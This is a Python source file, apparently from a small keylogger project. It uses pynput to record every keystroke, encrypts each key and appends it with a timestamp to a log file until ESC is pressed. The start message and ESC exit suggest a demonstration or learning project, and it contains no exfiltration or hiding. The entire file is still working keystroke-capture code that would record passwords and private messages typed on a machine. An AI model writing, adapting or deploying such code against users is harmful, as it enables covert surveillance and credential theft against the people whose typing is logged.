from pynput.keyboard import Key, Listener
from datetime import datetime
import os
import sys

# Add current directory to path
current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(current_dir)

# Now import project modules
from utils.encryption import encrypt
from config import ENC_LOG_FILE

# Ensure logs directory exists
os.makedirs(os.path.dirname(ENC_LOG_FILE), exist_ok=True)


def write_file(key):
    k = str(key).replace("'", "")
    if k == "Key.space":
        k = " "
    elif k == "Key.enter":
        k = "\n"
    elif k.startswith("Key."):
        k = f"[{k}]"
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    encrypted_key = encrypt(k)
    with open(ENC_LOG_FILE, "a") as f:
        f.write(f"{timestamp} - {encrypted_key}\n")


def on_press(key):
    write_file(key)


def on_release(key):
    if key == Key.esc:
        return False  # Stop on ESC


if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
